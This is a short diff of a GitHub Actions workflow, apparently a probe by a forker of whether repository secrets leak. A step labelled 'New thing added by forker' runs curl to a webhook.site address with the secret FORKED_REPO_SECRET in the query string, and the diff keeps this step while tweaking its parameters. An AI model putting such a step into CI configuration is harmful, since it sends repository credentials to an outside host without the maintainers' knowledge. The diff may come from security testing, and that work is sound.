@@ -11,7 +11,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: New thing added by forker
-      run: curl https://webhook.site/c03c8df8-0054-4a08-9ee4-f1f1ab811e2e?s=${{ secrets.FORKED_REPO_SECRET }}
+      run: curl https://webhook.site/c03c8df8-0054-4a08-9ee4-f1f1ab811e2e?s=${{ secrets.FORKED_REPO_SECRET }}&hello=world
 
     - name: Set up Go 1.13
       uses: actions/setup-go@v1
